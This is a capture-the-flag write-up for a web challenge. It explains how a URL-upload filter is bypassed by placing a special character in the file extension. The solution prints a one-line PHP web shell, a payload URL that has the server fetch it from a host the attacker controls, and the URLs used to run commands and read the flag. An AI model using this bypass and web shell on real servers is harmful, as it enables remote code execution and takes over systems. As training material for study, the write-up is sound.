# Remote

Author: `tacex`

I just released the newest version of my online image repository.

Patch notes:
- Added ability to upload via URL

Note: The flag is located in `/var/www/`.

## Solution

In the `README.md` file as well as the given source code in `index.php`, we can see that there is a feature which allows upload with URL. In the source code in `index.php`, we can see that before uploading the file from the URL, the URL is filtered with PHP functions `preg_match` and `filter_var`. Due to the order of the filtering functions being used, we can bypass the filter by using a character which would normally be filtered by `filter_var` inside of the file extension, which will allow the file name to bypass both filters by first tricking `preg_match` and leaving us with a completed file name after `filter_var`.

The payload used to upload the file:
```
http://172.17.0.1:10001/shell.p©hp
```

The code of shell.php:
```php
<?php echo system($_GET['cmd']);?>
```

Keep in mind that we need to host the file, which can be done through a variety of methods.

In the source code, we can see where the file is uploaded to, which is based on the cookie `PHPSESSID` and a randomized filename.

After uploading the file `shell.php`, we can access the file via `https://remote.tamuctf.com/uploads/<PHPSESSID>/<filename>.php`

To execute commands, we can access the URL `https://remote.tamuctf.com/uploads/<PHPSESSID>/<filename>.php?cmd=<command>`.

To read the flag: `https://remote.tamuctf.com/uploads/<PHPSESSID>/<filename>.php?cmd=cat /tmp/flag-<random data>.txt`.

Flag: `gigem{new_features_means_new_opportunities}`
